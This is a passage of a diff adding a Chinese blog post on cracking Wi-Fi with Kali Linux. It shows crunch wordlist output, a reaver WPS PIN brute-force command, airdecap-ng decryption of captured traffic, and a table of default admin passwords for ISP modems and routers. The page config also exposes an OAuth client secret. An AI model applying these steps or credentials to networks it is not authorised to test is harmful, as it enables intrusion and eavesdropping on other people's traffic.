completed generating output</span><br><span class="line">crunch:  79% completed generating output</span><br><span class="line">crunch:  86% completed generating output</span><br><span class="line">crunch:  93% completed generating output</span><br><span class="line">crunch: 100% completed generating output</span><br><span class="line"></span><br><span class="line">└─# <span class="built_in">ls</span> -l | grep 136</span><br><span class="line">-rwxrwxrwx 1 1000 1000  1200000000 May 23 15:16 136.txt</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，生成的密码字典还是比较大的。</p>
+<h2 id="0x03-破解WPS-PIN码"><a href="#0x03-破解WPS-PIN码" class="headerlink" title="0x03 破解WPS PIN码"></a>0x03 破解WPS PIN码</h2><p>WPS（Wi-Fi Protected Setup，Wi-Fi保护设置）是由Wi-Fi联盟组织实施的认证项目，主要致力于简化无线网络的安全加密设置。在传统方式下，用户新建一个无线网络时，必须在接入点手动设置网络名（SSID）和安全密钥，然后在客户端验证密钥以阻止“不速之客”的闯入。Wi-Fi Protected Setup能帮助用户自动设置网络名（SSID）、配置最高级别的WPA2安全密钥，具备这一功能的无线产品往往在机身上设计有一个功能键，称为WPS按钮，用户只需轻轻按下该按钮或输入个人识别号码( PIN )，再经过两三步简单操作即可完成无线加密设置，同时在客户端和路由器之间建立起一个安全的连接。</p>
+<p>PIN码是随机产生的8位数字。，可以通过穷举遍历的方式进行破解。PIN码的第8位数是一个校验和 ( checksum) , 因此黑客只需算出前7位数即可。这样，唯一的PIN码的数量降了一个级次变成了10的7次方,也就是说有1000万种变化。</p>
+<p>在实施PIN的身份识别时,接入点(无线路由器)实际上是要找出这个PIN的前半部分(前4位)和后半部分(后3位)是否正确即可。当第一次PIN认证连接失败后 ,路由器会向客户端发回一个<code>EAP-NACK</code>信息,而通过该回应,攻击者将能够确定的PIN前半部或后半部是否正确。换句话说,黑客只需从7位数的PIN中找出一个4位数的PIN和一一个3位数的PIN。这样一来,级次又被降低，从1000万种变化，减少到11000 ( 10的4次方 + 10的3次方)种变化。因此,在实际破解尝试中,黑客最多只需试验<code>11000</code>次。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# reaver -i wlp0s20f3mon -b D0:C7:C0:DF:2A:74 -vv</span><br></pre></td></tr></table></figure>
+
+<p>不过目前这种攻击方法成功率非常低，只有少数非常老的路由器可能存在这个漏洞。</p>
+<h2 id="0x04-网络流量嗅探"><a href="#0x04-网络流量嗅探" class="headerlink" title="0x04 网络流量嗅探"></a>0x04 网络流量嗅探</h2><p>首先使用<code>airodump-ng</code>命令抓取数据包（必须包含握手包才能解密）；然后使用<code>airdecap-ng</code>命令解密数据包。</p>
+<p>用法：<code>airdecap-ng -e &lt;Wifi SSID&gt; -p &lt;Wifi密码&gt; &lt;生成的.cap文件&gt;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─# airdecap-ng -e drunkdream -p 12345678 dump-01.cap</span><br><span class="line">Total number of stations seen            4</span><br><span class="line">Total number of packets <span class="built_in">read</span>          8838</span><br><span class="line">Total number of WEP data packets         0</span><br><span class="line">Total number of WPA data packets      2905</span><br><span class="line">Number of plaintext data packets         0</span><br><span class="line">Number of decrypted WEP  packets         0</span><br><span class="line">Number of corrupted WEP  packets         0</span><br><span class="line">Number of decrypted WPA  packets      2228</span><br><span class="line">Number of bad TKIP (WPA) packets         0</span><br><span class="line">Number of bad CCMP (WPA) packets         0</span><br></pre></td></tr></table></figure>
+
+<p>解密出来的数据包保存在<code>dump-01-dec.cap</code>文件中，直接使用wireshark打开即可。不过这种情况与本地抓包相同，是不能解密<code>https</code>数据包的。如果想解密https数据包，可以考虑结合<code>中间人攻击</code>。</p>
+<h2 id="0x05-破解路由器密码"><a href="#0x05-破解路由器密码" class="headerlink" title="0x05 破解路由器密码"></a>0x05 破解路由器密码</h2><p>获取到密码后就可以成功连接到Wifi了，此时如果登入路由器管理页面，会拿到更多的信息。</p>
+<p>一般路由器的ip地址为：<code>192.168.1.1</code>、<code>192.168.10.1</code>、<code>192.168.100.1</code>等。实在不行还可以通过ip和端口扫描来判断。</p>
+<p>获取到ip地址后就需要获取登录密码了。一些常见的默认密码如下：</p>
+<table>
+<thead>
+<tr>
+<th>路由器类型</th>
+<th>账号</th>
+<th>密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>移动光猫</td>
+<td>CMCCAdmin</td>
+<td>aDm8H%MdA</td>
+</tr>
+<tr>
+<td>联通光猫</td>
+<td>CUAdmin</td>
+<td>CUAdmin</td>
+</tr>
+<tr>
+<td>电信光猫</td>
+<td>telecomadmin</td>
+<td>nE7jA%5m</td>
+</tr>
+<tr>
+<td>华为</td>
+<td>telecomadmin</td>
+<td>admintelecom</td>
+</tr>
+</tbody></table>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>破解无线网络密码的关键是抓取到握手包，然后使用字典进行离线爆破。因此字典中是否包含密码成了能否破解出密码的关键。</p>
+<p>WPS是另一种破解WIFI的方法，但实际测试中发现成功率非常低。</p>
+<h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><ul>
+<li><a href="https://www.jianshu.com/p/2ec8b2ef84ae">Kali 2 | 用airmon-ng开始我的第一次无线渗透测试</a></li>
+<li><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/52.html">使用Aircrack-ng工具破解无线网络</a></li>
+<li><a href="https://blkstone.github.io/2015/08/19/reaver-tutorial/">利用 reaver 进行无线安全审计</a></li>
+<li><a href="https://linux.cn/article-2335-1.html">如何使用Reaver破解Wi-Fi网络的WPA密码</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>drunkdream
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://www.drunkdream.com/2022/05/22/kali-wifi-cracking/" title="使用Kali系统进行无线网络破解">https://www.drunkdream.com/2022/05/22/kali-wifi-cracking/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Kali/" rel="tag"># Kali</a>
+              <a href="/tags/Wifi/" rel="tag"># Wifi</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/05/05/icmp-tunnel-through-nat/" rel="prev" title="如何实现支持NAT的ICMP隧道">
+                  <i class="fa fa-angle-left"></i> 如何实现支持NAT的ICMP隧道
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/06/27/debug-github-actions/" rel="next" title="在线调试Github Actions">
+                  在线调试Github Actions <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2017 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">drunkdream</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"drunkdream","repo":"drunkdream.github.io","client_id":"b6aad8c93b6aadccfcc8","client_secret":"88b3043a118f3e6db76f75bdb9257228db104949","admin_user":"drunkdream","distraction_free_mode":true,"proxy":"/github/login/oauth/access_token","language":"zh-CN","body":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"793e656fbfea319fbaf7083d840750e6","path":"/2022/05/22/kali-wifi-cracking/"}</script>
+<script src="/js/third-party/comments/gitalk.js" defer></script>
+
+</body>
+</html>
